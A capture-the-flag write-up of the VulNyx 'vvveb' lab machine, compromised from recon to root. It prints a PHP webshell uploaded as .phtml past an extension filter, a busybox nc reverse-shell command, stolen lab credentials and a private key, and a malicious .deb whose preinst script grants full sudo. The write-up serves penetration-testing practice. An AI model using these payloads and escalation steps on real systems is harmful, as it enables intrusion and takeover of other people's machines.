# vvveb

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| vvveb | zer0arc4 | Medium | VulNyx |

**Summary:** The target runs Vvveb CMS 1.0.5 behind Apache with PHP 8.4, and its attack surface opens with a hidden endpoint at `/system/secret` that serves a credential token obfuscated through three layers: a base64 wrapper around an `xxd` style hexdump, whose ASCII column is itself hex, which decodes to a final base64 string spelling out the admin panel password `admin:scottgreen`. Those credentials unlock the administrative backend, where the media library upload filter blocks only `php`, `svg`, and `js` extensions, so a one line webshell named `shell.phtml` sails through, executes with PHP rights under Apache, and yields an interactive reverse shell as `www-data` via `busybox nc` caught by penelope. Internal enumeration of the webroot reveals that the MariaDB account `bunny` with password `buNNy_P@$$w0rd_99` from `config/db.php` is also a valid SSH login, and the same www-data context can read zer0arc4's world readable passphrase protected ed25519 private key. From the bunny shell the attacker notices that the machine root directory is littered with world readable operator files, one of them a dictionary named `/pass.dic`, whose entry `fromyesterday` unlocks the stolen key and grants SSH access as zer0arc4. That final user carries a sudo rule allowing `dpkg` without a password, and because dpkg executes the preinst maintainer script of any package it installs as root, a hand built `.deb` whose preinst appends a `NOPASSWD:ALL` line to `/etc/sudoers` turns the dpkg grant into full root, ending with the user and root flags.

---

## Reconnaissance

The engagement started on the VirtualBox host only network `192.168.56.0/24`, with the attacker at `192.168.56.1`. Host discovery ran first so the target address could be confirmed before any port work.

1. ARP ping sweep located the live machines.

```bash
~/projects/labs/nyx                                                                                           19:54:39
❯ sudo nmap -sn -PR 192.168.56.0/24
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-07 19:54 +0700
Nmap scan report for 192.168.56.100
Host is up (0.000067s latency).
MAC Address: 08:00:27:6D:60:9D (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.172
Host is up (0.00053s latency).
MAC Address: 08:00:27:82:8D:95 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 10.78 seconds
```

2. A full TCP scan with default scripts and version detection fingerprinted the attack surface.

```bash
~/projects/labs/nyx                                                                                      11s 19:54:54
❯ ip=192.168.56.172

~/projects/labs/nyx                                                                                           19:55:21
❯ nmap -p- -sCV -Pn -T4 --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-07 19:55 +0700
Nmap scan report for 192.168.56.172
Host is up (0.0096s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.68 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.68 (Debian)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Vvveb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.53 seconds
```

Two services only: OpenSSH on 22 with no known credentials, and Apache 2.4.68 on 80 serving a site titled Vvveb. Everything for initial access therefore had to come through the web application, and the machine name itself was a direct hint at which CMS to study.

3. Content discovery mapped the application layout.

```bash
~/projects/labs/nyx                                                                   1m 39s 06:47:22
❯ feroxbuster -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html -t 10 -n -C 403,404 -q --depth 1
                                                                                                     200      GET      606l     1594w    29078c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                     403      GET        9l       29w      319c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                     200      GET      127l      680w    62475c http://192.168.56.172/public/image-cache/product/9-2-400x510_cs.jpg
200      GET       99l      430w    40575c http://192.168.56.172/public/image-cache/product/8-1-400x510_cs.jpg
200      GET      129l      541w    44923c http://192.168.56.172/public/image-cache/product/6-2-400x510_cs.jpg
200      GET       85l      608w    53300c http://192.168.56.172/public/image-cache/posts/5-400x225_cs.jpg
200      GET     1196l     2938w    59318c http://192.168.56.172/shop
200      GET      792l     2039w    40212c http://192.168.56.172/cart/add/19
200      GET        7l       30w     1354c http://192.168.56.172/public/img/flags/en.png
200      GET       95l      543w    48359c http://192.168.56.172/public/image-cache/product/6-1-400x510_cs.jpg
302      GET        2l       21w      181c http://192.168.56.172/user/orders => http://192.168.56.172/user/login
200      GET       68l      362w    35369c http://192.168.56.172/public/image-cache/product/9-1-400x510_cs.jpg
302      GET        2l       21w      181c http://192.168.56.172/user/wishlist/add/17 => http://192.168.56.172/user/login
302      GET        2l       21w      181c http://192.168.56.172/user => http://192.168.56.172/user/login
200      GET      258l     1622w   142051c http://192.168.56.172/public/image-cache/posts/3-800x450_cs.jpg
200      GET       57l      293w    30008c http://192.168.56.172/public/image-cache/product/2-2-400x510_cs.jpg
200      GET       81l      431w    44924c http://192.168.56.172/public/image-cache/product/5-1-400x510_cs.jpg
200      GET        3l       22w     1368c http://192.168.56.172/public/media/favicon.ico
200      GET       74l      468w    44402c http://192.168.56.172/public/image-cache/product/5-2-400x510_cs.jpg
200      GET      123l      727w    59535c http://192.168.56.172/public/image-cache/product/4-2-400x510_cs.jpg
200      GET     1161l     3448w    55880c http://192.168.56.172/blog/1
302      GET        2l       21w      181c http://192.168.56.172/user/wishlist/add/19 => http://192.168.56.172/user/login
200      GET     1637l     6243w    81841c http://192.168.56.172/cat/electronics
200      GET      302l     2059w   198730c http://192.168.56.172/public/image-cache/posts/6-800x450_cs.jpg
200      GET      295l     1796w   163775c http://192.168.56.172/public/image-cache/posts/5-800x450_cs.jpg
200      GET      400l     2283w   210168c http://192.168.56.172/public/image-cache/posts/4-800x450_cs.jpg
200      GET      128l      695w    64390c http://192.168.56.172/public/image-cache/product/3-1-400x510_cs.jpg
200      GET      114l      699w    62973c http://192.168.56.172/public/image-cache/product/4-1-400x510_cs.jpg
200      GET      192l     2625w    19860c http://192.168.56.172/feed/posts
200      GET     1161l     3448w    55883c http://192.168.56.172/blog
302      GET        2l       21w      181c http://192.168.56.172/user/wishlist/add/18 => http://192.168.56.172/user/login
200      GET      136l      746w    63528c http://192.168.56.172/public/image-cache/posts/4-400x225_cs.jpg
200      GET      116l      773w    64251c http://192.168.56.172/public/image-cache/posts/6-400x225_cs.jpg
200      GET       37l      221w    15011c http://192.168.56.172/public/media/logo-white.png
200      GET       88l      455w    43273c http://192.168.56.172/public/image-cache/product/7-2-400x510_cs.jpg
302      GET        2l       21w      181c http://192.168.56.172/user/wishlist/add/12 => http://192.168.56.172/user/login
200      GET       34l       84w     1583c http://192.168.56.172/feed/comments
302      GET        2l       21w      181c http://192.168.56.172/user/wishlist/add/14 => http://192.168.56.172/user/login
302      GET        2l       21w      181c http://192.168.56.172/user/wishlist/add/15 => http://192.168.56.172/user/login
200      GET      710l     1766w    32775c http://192.168.56.172/page/pricing-13
200      GET        9l       17w     1551c http://192.168.56.172/public/media/logo.png
200      GET     1672l     4425w    84776c http://192.168.56.172/product/product-nineteen-19
200      GET      151l      905w    77548c http://192.168.56.172/public/image-cache/product/3-2-400x510_cs.jpg
200      GET       53l      301w    32449c http://192.168.56.172/public/image-cache/product/2-1-400x510_cs.jpg
200      GET      824l     2116w    40373c http://192.168.56.172/user/return-form
200      GET     1067l     2662w    52872c http://192.168.56.172/vendor
200      GET      111l      592w    57049c http://192.168.56.172/public/image-cache/product/7-1-400x510_cs.jpg
200      GET       34l      117w     1293c http://192.168.56.172/manifest.webmanifest
200      GET      114l      689w    62772c http://192.168.56.172/public/image-cache/product/8-2-400x510_cs.jpg
200      GET      794l     1992w    36243c http://192.168.56.172/page/about-11
302      GET        2l       21w      181c http://192.168.56.172/user/wishlist/add/13 => http://192.168.56.172/user/login
302      GET        2l       21w      181c http://192.168.56.172/user/wishlist => http://192.168.56.172/user/login
302      GET        2l       21w      181c http://192.168.56.172/user/wishlist/add/16 => http://192.168.56.172/user/login
200      GET     1017l     2659w    49206c http://192.168.56.172/product/product-sixteen-16
200      GET     1237l     2935w    57544c http://192.168.56.172/product/product-eighteen-18
200      GET     1623l     4279w    77375c http://192.168.56.172/
301      GET        9l       29w      357c http://192.168.56.172/public => http://192.168.56.172/public/
200      GET     1199l     2956w    59515c http://192.168.56.172/shop/2
200      GET     1199l     2956w    59427c http://192.168.56.172/shop/3
200      GET      911l     2278w    44855c http://192.168.56.172/shop/4
200      GET     1196l     2938w    59315c http://192.168.56.172/shop/1
301      GET        9l       29w      356c http://192.168.56.172/admin => http://192.168.56.172/admin/
301      GET        9l       29w      358c http://192.168.56.172/plugins => http://192.168.56.172/plugins/
301      GET        9l       29w      357c http://192.168.56.172/system => http://192.168.56.172/system/
301      GET        9l       29w      358c http://192.168.56.172/install => http://192.168.56.172/install/
301      GET        9l       29w      354c http://192.168.56.172/app => http://192.168.56.172/app/
301      GET        9l       29w      357c http://192.168.56.172/config => http://192.168.56.172/config/
302      GET        2l       21w      181c http://192.168.56.172/checkout => http://192.168.56.172/cart
200      GET        2l        4w       26c http://192.168.56.172/robots.txt
200      GET      794l     1992w    36226c http://192.168.56.172/about-11
200      GET      794l     1992w    36226c http://192.168.56.172/2006-11
200      GET      661l     5535w    34523c http://192.168.56.172/LICENSE
200      GET      794l     1992w    36226c http://192.168.56.172/2005-11
```

The scan is an unmistakable Vvveb fingerprint: a storefront under `/shop`, `/cat`, and `/product`, a `/user` area redirected to login, plus the CMS internals `/admin`, `/system`, `/install`, `/app`, and `/config`. An administrative panel reachable from the network is only useful with credentials, so the question became where this box kept them.

4. A custom endpoint under `/system` answered with an oddly shaped token.

```bash
~/projects/labs/nyx                                                                          07:04:21
❯ curl -s http://$ip/system/secret
MDAwMDAwMDAgIDM1IDM5IDIwIDM1IDM3IDIwIDM1IDMyIDIwIDM3IDM0IDIwIDM2IDMxIDIwIDM1ICB8NTkgNTcgNTIgNzQgNjEgNXwKMDAwMDAwMTAgIDM3IDIwIDMzIDM0IDIwIDMzIDM2IDIwIDM2IDMzIDIwIDMzIDMyIDIwIDM0IDY1ICB8NyAzNCAzNiA2MyAzMiA0ZXwKMDAwMDAwMjAgIDIwIDM3IDM2IDIwIDM2IDM0IDIwIDM0IDM4IDIwIDM1IDMyIDIwIDM2IDY1IDIwICB8IDc2IDY0IDQ4IDUyIDZlIHwKMDAwMDAwMzAgIDM2IDMzIDIwIDM2IDY0IDIwIDM1IDM2IDIwIDM2IDYzIDIwIDM2IDMyIDIwIDM2ICB8NjMgNmQgNTYgNmMgNjIgNnwKMDAwMDAwNDAgIDM3IDIwIDMzIDY0IDIwIDMzIDY0ICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8NyAzZCAzZHw=
```

The blob is base64, and decoding it once does not yield a secret but rather the text form of an `xxd` hexdump, whose right hand ASCII column is again a list of hex byte values. Converting those hex values to characters produces a second base64 string, and decoding that closes the chain. The layers, in order, are: base64, hexdump ASCII column, hex bytes to text, base64 again. The final plaintext is the admin panel credential pair `admin:scottgreen`.

![Decoding the secret through its three layers](images/Pasted%20image%2020260913070203.png)

---

## Initial Access

### Logging into the Vvveb Backend

5. With `admin:scottgreen` in hand the login form at `/admin/index.php?module=user/login` was filled and submitted in the browser. The session landed on the full administrative dashboard of Vvveb CMS 1.0.5, complete with site editing tools, a media library, plugin and theme managers, and a settings area.

![Authenticated Vvveb admin dashboard](images/Pasted%20image%2020260913070559.png)

### Upload Filter Bypass with .phtml

An admin panel on a PHP CMS is an invitation to look at file uploads, because Vvveb ships a media manager that accepts arbitrary user files. The upload handler rejects a denylist of extensions rather than enforcing an allowlist, and the classic PHP 8 era blind spot applies: Apache on this box maps `.phtml` through the PHP module exactly like `.php`, but the denylist only knows `php`, `svg`, and `js`. A PHP webshell with a `.phtml` extension therefore uploads cleanly and executes.

6. The payload was a single line.

```bash
~/projects/labs/nyx                                                                          07:22:34
❯ cat shell.phtml
<?php system($_GET["cmd"]); ?>
```

It went up through the media library upload dialog, and the file landed in the web accessible media directory at `/public/media/`.

![Uploading shell.phtml through the media manager](images/Pasted%20image%2020260913072354.png)

7. Command execution was confirmed with one request.

```bash
~/projects/labs/nyx                                                                          07:22:38
❯ curl -s 'http://192.168.56.172/public/media/shell.phtml?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

8. From query driven command execution to an interactive session.

```bash
~/projects/labs/nyx                                                                          07:25:29
❯ curl -s 'http://192.168.56.172/public/media/shell.phtml?cmd=busybox%20nc%20192.168.56.1%205555%20-e%20/bin/bash'
```

```bash
~/projects/labs/nyx                                                                          07:25:45
❯ penelope -p 5555
[+] Listening for reverse shells on 0.0.0.0:5555 -> 127.0.0.1 • 192.168.0.6 • 172.16.0.2 • 192.168.56.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => vvveb 192.168.56.172 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/setyanoegraha/.penelope/sessions/vvveb~192.168.56.172-Linux-x86_64/2026_09_13-07_26_11-624-www-data_33.log
──────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@vvveb:/var/www/vvveb/public/media$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
zer0arc4:x:1000:1000:zer0arc4,,,:/home/zer0arc4:/bin/bash
bunny:x:1001:1001:bunny,,,:/home/bunny:/bin/bash
```

penelope caught the connect back and handed over a full PTY session, so no manual upgrade sequence was needed. The password file shows exactly two interactive humans on the box, `zer0arc4` holding the user flag and `bunny` running the database.

---

## Lateral Movement

### Database Credentials Reused for SSH

9. Enumeration of the webroot turned up two things worth having. The first is the SSH private key of zer0arc4, sitting world readable in the `.ssh` directory because the home, dot directory, and key file were all opened to others, far looser than convention. The second is `config/db.php`, which stores the live MariaDB credentials.

```bash
www-data@vvveb:/home/zer0arc4/.ssh$ cat id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCo7Plt7j
8XFkJgyg5j0V/sAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGnIfW+7sui/MHa3
yPUtnBdLgNviK49385AVwBs0lvIEAAAAoBdVA8IAVOoLeVOzj+uzcx/TFyXUHeWLWnhgFr
kbsjGswD/hrnGTcKSRF+uoS0IY68Pr5GI+Ku8LNLB/OWzPF+6mEKa1CCLpfpaCWLo7F0U6
zL/GfntQbdXVtIYZ7zJzbskeRWG8Z9ufiDJ58DMREBHb+ATByAfdx7Er/726JmEZNnzOje
1P00vISDkh0CDXfkvQTgEnR1UuD86tjUjWMno=
-----END OPENSSH PRIVATE KEY-----
www-data@vvveb:/home/zer0arc4/.ssh$ ssh-keygen -y -f id_ed25519
Enter passphrase for "id_ed25519":
```

The key is protected by a passphrase, so it is a check written into the lock rather than an open door, and cracking it offline against the bcrypt KDF is brutally slow.

Further enumeration:

```bash
www-data@vvveb:/var/www/vvveb/config$ cat db.php
<?php
 return array (
  'default' => 'mysqli',
  'connections' =>
  array (
    'mysqli' =>
    array (
      'engine' => 'mysqli',
      'host' => '127.0.0.1',
      'database' => 'vvveb',
      'user' => 'bunny',
      'password' => 'buNNy_P@$$w0rd_99',
      'port' => NULL,
      'prefix' => '',
    ),
  ),
);
```

The database user is the human account `bunny`, and on Debian boxes with local SSH the database password is prime reuse material. Logging in as bunny with `buNNy_P@$$w0rd_99` worked immediately, which also explains the odd key layout of the password: it was built for a rabbit (`bunny` with two n's), and the `P@$$w0rd` leetspeak was a decoy for the passphrase hunt rather than the answer to it. A base64 scrap found in zer0arc4's home directory reinforces the decoy, pointing to a numeric range guess of 200000 to 2000000, but that path only wastes cycles against bcrypt.

```bash
www-data@vvveb:/home/zer0arc4$ echo 'c29tZSAyMDAwMDAgMjAwMDAwMAA=' | base64 -d
some 200000 2000000
```

10. Inside the bunny session the operator left the machine's real answer out in the open. Listing the root directory reveals that the box builders dropped their tooling files directly at `/`, and a small dictionary named `/pass.dic` is world readable.

```bash
bunny@vvveb:~$ ls -la /
total 116
drwxr-xr-x  19 root root  4096 Sep  4 11:43 .
drwxr-xr-x  19 root root  4096 Sep  4 11:43 ..
lrwxrwxrwx   1 root root     7 Sep  4 08:21 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Sep  4 08:25 boot
-rw-rw-r--   1 root root  1165 Aug 31 06:33 crack.py
drwxr-xr-x  18 root root  3240 Sep 12 19:37 dev
drwxr-xr-x  79 root root  4096 Sep  5 06:15 etc
-rw-rw-r--   1 root root    73 Sep  4 09:25 hash
-rw-rw-r--   1 root root   648 Sep  4 11:28 hash.txt
drwxr-xr-x   4 root root  4096 Sep  4 08:55 home
-rw-------   1 root root   464 Sep  4 11:21 id_ed25519
lrwxrwxrwx   1 root root    36 Sep  4 08:23 initrd.img -> boot/initrd.img-6.12.107+deb13-amd64
lrwxrwxrwx   1 root root    35 Sep  4 08:22 initrd.img.old -> boot/initrd.img-6.12.94+deb13-amd64
lrwxrwxrwx   1 root root     7 Sep  4 08:21 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Sep  4 08:21 lib64 -> usr/lib64
drwx------   2 root root 16384 Sep  4 08:21 lost+found
drwxr-xr-x   3 root root  4096 Sep  4 08:21 media
drwxr-xr-x   2 root root  4096 Sep  4 08:21 mnt
drwxrwxr-x   5 root root  4096 Sep  4 11:43 myenv
drwxr-xr-x   2 root root  4096 Sep  4 08:21 opt
-rw-rw-r--   1 root root    72 Sep  4 11:36 pass.dic
dr-xr-xr-x 122 root root     0 Sep 12 19:37 proc
drwx------   4 root root  4096 Sep  5 09:30 root
drwxr-xr-x  23 root root   600 Sep 12 20:58 run
lrwxrwxrwx   1 root root     8 Sep  4 08:21 sbin -> usr/sbin
-rw-rw-r--   1 root root  2350 Aug 31 06:09 script.py
-rwxrwxr-x   1 root root 18704 Aug 31 06:29 secure_auth
drwxr-xr-x   2 root root  4096 Sep  4 08:21 srv
dr-xr-xr-x  13 root root     0 Sep 12 20:59 sys
drwxrwxrwt   2 root root   100 Sep 12 20:54 tmp
drwxr-xr-x  12 root root  4096 Sep  4 08:21 usr
drwxr-xr-x  12 root root  4096 Sep  4 08:26 var
lrwxrwxrwx   1 root root    33 Sep  4 08:23 vmlinuz -> boot/vmlinuz-6.12.107+deb13-amd64
lrwxrwxrwx   1 root root    32 Sep  4 08:22 vmlinuz.old -> boot/vmlinuz-6.12.94+deb13-amd64
-rw-rw-r--   1 root root    13 Sep  4 11:38 x.sh
bunny@vvveb:~$ cat /pass.dic
nineintheafternoon
buNNy_P@$$w0rd_99
Umeshchandra02@vulnyx
fromyesterday
```

Four entries, one of which is bunny's own password, which confirms the file is the operator's real dictionary rather than a random artifact. The value `fromyesterday` is the passphrase behind zer0arc4's key.

### SSH into zer0arc4

11. With the private key copied off the box and the passphrase known, the user shell is one login away.

```bash
~/projects/labs/nyx                                                                      33s 08:00:35
❯ ssh -i id_ed5519 zer0arc4@$ip
Enter passphrase for key 'id_ed5519':
Linux vvveb 6.12.107+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.107-1 (2026-08-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Sep 12 21:00:29 2026 from 192.168.56.1
zer0arc4@vvveb:~$
```

---

## Privilege Escalation

### sudo dpkg Package Abuse

12. The first thing zer0arc4 owns is a sudo rule, and it is a dangerous classic: `dpkg` runs as root without a password.

```bash
zer0arc4@vvveb:~$ sudo -l
Matching Defaults entries for zer0arc4 on vvveb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User zer0arc4 may run the following commands on vvveb:
    (root) NOPASSWD: /usr/bin/dpkg
```

Installing a `.deb` package is code execution by definition, because dpkg runs the package's `preinst` and `postinst` maintainer scripts with the privileges of the installer, which here is root. The grant is therefore equivalent to unrestricted root, and the abuse is to build a tiny throwaway package whose maintainer script appends a sudoers line for zer0arc4.

13. The package was assembled in `/tmp`, built, and installed through the sudo rule.

```bash
zer0arc4@vvveb:~$ mkdir -p /tmp/evil/DEBIAN
zer0arc4@vvveb:~$ cat << 'EOF' > /tmp/evil/DEBIAN/preinst
> #!/bin/sh
> echo "zer0arc4 ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
> EOF
zer0arc4@vvveb:~$ chmod +x /tmp/evil/DEBIAN/preinst
zer0arc4@vvveb:~$ cat << 'EOF' > /tmp/evil/DEBIAN/control
> Package: evil
> Version: 1.0
> Architecture: all
> Maintainer: x
> Description: x
> EOF
zer0arc4@vvveb:~$ dpkg-deb -b /tmp/evil /tmp/evil.deb
dpkg-deb: warning: root directory /tmp/evil has unusual owner or group 1000:1000
dpkg-deb: hint: you might need to pass --root-owner-group, see <https://wiki.debian.org/Teams/Dpkg/RootlessBuilds> for further details
dpkg-deb: warning: ignoring 1 warning about the control file(s)
dpkg-deb: building package 'evil' in '/tmp/evil.deb'.
zer0arc4@vvveb:~$ sudo -u root dpkg -i /tmp/evil.deb
Selecting previously unselected package evil.
(Reading database ... 45029 files and directories currently installed.)
Preparing to unpack /tmp/evil.deb ...
Unpacking evil (1.0) ...
Setting up evil (1.0) ...
```

14. The appended sudoers line took effect immediately.

```bash
zer0arc4@vvveb:~$ sudo -l
Matching Defaults entries for zer0arc4 on vvveb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User zer0arc4 may run the following commands on vvveb:
    (root) NOPASSWD: /usr/bin/dpkg
    (ALL : ALL) NOPASSWD: ALL
```

15. Root, both flags, done.

```bash
zer0arc4@vvveb:~$ sudo -i
root@vvveb:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
vvveb
root@vvveb:~# cat /home/zer0arc4/user.txt /root/root.txt
a83...
9fb...
```

---

## Attack Chain Summary

1. **Reconnaissance**: Host discovery fixed the target at `192.168.56.172` with only SSH and Apache open, and content enumeration mapped a Vvveb CMS storefront with its `/admin`, `/system`, and `/config` internals exposed.
2. **Vulnerability Discovery**: The hidden `/system/secret` endpoint leaked a credential token hidden inside three decoding layers, and once unwrapped it delivered the admin panel pair `admin:scottgreen`.
3. **Exploitation**: After logging into the backend, the media manager's extension denylist (blocking `php`, `svg`, and `js` but not `.phtml`) was bypassed by uploading a PHP webshell, and a `busybox nc` callback gave an interactive shell as `www-data`.
4. **Internal Enumeration**: The webapp config leaked the MariaDB password `buNNy_P@$$w0rd_99`, which doubled as bunny's SSH password, and bunny's shell exposed the world readable `/pass.dic` whose entry `fromyesterday` unlocked zer0arc4's world readable encrypted SSH key for a full user session.
5. **Privilege Escalation**: zer0arc4 could run `dpkg` as root without a password, so a handcrafted `.deb` with a `preinst` script appended an `ALL=(ALL:ALL) NOPASSWD:ALL` line to `/etc/sudoers`, and `sudo -i` produced the root shell and both flags.
